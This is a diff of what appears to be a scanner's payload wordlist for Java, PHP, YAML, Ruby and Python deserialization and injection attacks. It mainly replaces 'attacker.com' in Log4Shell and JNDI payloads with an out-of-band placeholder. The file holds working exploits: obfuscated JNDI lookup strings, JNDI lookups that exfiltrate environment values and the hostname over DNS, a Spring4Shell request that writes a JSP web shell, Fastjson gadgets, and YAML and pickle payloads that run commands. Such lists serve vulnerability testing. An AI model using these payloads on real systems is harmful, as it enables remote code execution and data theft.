@@ -2,30 +2,30 @@
 # Java | PHP | Python | .NET | Ruby | Node.js | YAML | Log4Shell | Spring4Shell
 
 # ── LOG4SHELL / LOG4J (CVE-2021-44228) ──
-${jndi:ldap://attacker.com/a}
-${jndi:ldaps://attacker.com/a}
-${jndi:rmi://attacker.com/a}
-${jndi:dns://attacker.com/a}
-${jndi:iiop://attacker.com/a}
-${jndi:corba://attacker.com/a}
-${jndi:nds://attacker.com/a}
+${jndi:ldap://{{OOB}}/a}
+${jndi:ldaps://{{OOB}}/a}
+${jndi:rmi://{{OOB}}/a}
+${jndi:dns://{{OOB}}/a}
+${jndi:iiop://{{OOB}}/a}
+${jndi:corba://{{OOB}}/a}
+${jndi:nds://{{OOB}}/a}
 ${jndi:ldap://127.0.0.1:1389/exploit}
 ${jndi:ldap://169.254.169.254/latest/meta-data/}
-${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
-${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
-${${upper:j}ndi:${upper:l}${upper:d}${lower:a}${upper:p}://attacker.com/a}
-${j${::-n}di:ldap://attacker.com/a}
-${j${lower:n}di:ldap://attacker.com/a}
-${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//attacker.com/a}
-${j${k8s:k5:-ND}i:ldap://attacker.com/a}
-${j${main:\k5:-Nd}i:ldap://attacker.com/a}
-${jn${::-d}i:ldap://attacker.com/a}
-${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://attacker.com/a}
-${${::-j}ndi:${::-l}dap://attacker.com/}
-%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D
-\${jndi:ldap://attacker.com/a}
-{{jndi:ldap://attacker.com/a}}
-${jndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{OOB}}/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{OOB}}/a}
+${${upper:j}ndi:${upper:l}${upper:d}${lower:a}${upper:p}://{{OOB}}/a}
+${j${::-n}di:ldap://{{OOB}}/a}
+${j${lower:n}di:ldap://{{OOB}}/a}
+${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{OOB}}/a}
+${j${k8s:k5:-ND}i:ldap://{{OOB}}/a}
+${j${main:\k5:-Nd}i:ldap://{{OOB}}/a}
+${jn${::-d}i:ldap://{{OOB}}/a}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://{{OOB}}/a}
+${${::-j}ndi:${::-l}dap://{{OOB}}/}
+%24%7Bjndi%3Aldap%3A%2F%2F{{OOB}}%2Fa%7D
+\${jndi:ldap://{{OOB}}/a}
+{{jndi:ldap://{{OOB}}/a}}
+${jndi:${lower:l}${lower:d}a${lower:p}://{{OOB}}/a}
 
 # ── SPRING4SHELL (CVE-2022-22965) ──
 class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=ws_shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
@@ -122,11 +122,11 @@ def cmd = ['bash','-c','id']
 def sout = new StringBuffer(); cmd.execute().waitForProcessOutput(sout, sout); sout.toString()
 
 # ── JNDI LDAP REFERENCE ATTACKS ──
-${jndi:ldap://attacker.com:1389/Exploit}
-${jndi:ldap://attacker.com:1389/Basic/Command/Base64/aWQ=}
-${jndi:ldap://attacker.com:1389/TomcatBypass/Command/Base64/aWQ=}
-${jndi:ldap://attacker.com:1389/WebSphere/xyz}
-${jndi:ldap://attacker.com:1389/Groovy/Command/Base64/aWQ=}
+${jndi:ldap://{{OOB}}:1389/Exploit}
+${jndi:ldap://{{OOB}}:1389/Basic/Command/Base64/aWQ=}
+${jndi:ldap://{{OOB}}:1389/TomcatBypass/Command/Base64/aWQ=}
+${jndi:ldap://{{OOB}}:1389/WebSphere/xyz}
+${jndi:ldap://{{OOB}}:1389/Groovy/Command/Base64/aWQ=}
 
 # ── XMLRPC DESERIALIZATION ──
 <?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>
@@ -143,31 +143,31 @@ X-Serialized-Object: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
 Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==
 
 # ── DETECTION PROBES ──
-${jndi:dns://attacker.com/probe}
+${jndi:dns://{{OOB}}/probe}
 {"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
-{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://attacker.com:1099/exploit"}
+{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://{{OOB}}:1099/exploit"}
 O:8:"stdClass":1:{s:4:"test";s:4:"test";}
 
 # ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
 # Log4Shell modern obfuscation + env exfil
-${jndi:ldap://${env:USER}.attacker.com/a}
-${jndi:ldap://${hostName}.attacker.com/a}
-${jndi:ldap://${sys:java.version}.attacker.com/a}
-${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap://attacker.com/a}
+${jndi:ldap://${env:USER}.{{OOB}}/a}
+${jndi:ldap://${hostName}.{{OOB}}/a}
+${jndi:ldap://${sys:java.version}.{{OOB}}/a}
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap://{{OOB}}/a}
 # Spring4Shell (CVE-2022-22965) class.module.classLoader gadget
 class.module.classLoader.resources.context.parent.pipeline.first.pattern=x
 class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
 class.module.classLoader.URLs[0]=0
 # Fastjson / Jackson polymorphic JNDI
-{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://attacker.com:1099/exploit","autoCommit":true}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{OOB}}:1099/exploit","autoCommit":true}
 {"@type":"org.apache.commons.dbcp.BasicDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"}}
-{"@type":"java.net.Inet4Address","val":"attacker.com"}
+{"@type":"java.net.Inet4Address","val":"{{OOB}}"}
 # serialized stream imza markerları (tespit)
 AAEAAAD/////
 H4sIA
 gASV
 # YAML / Ruby / Python tehlikeli yükler
-!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/"]]]]
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{{OOB}}/"]]]]
 !!ruby/object:Gem::Requirement
 !!python/object/apply:subprocess.check_output [["id"]]
 cos\nsystem\n(S'id'\ntR.
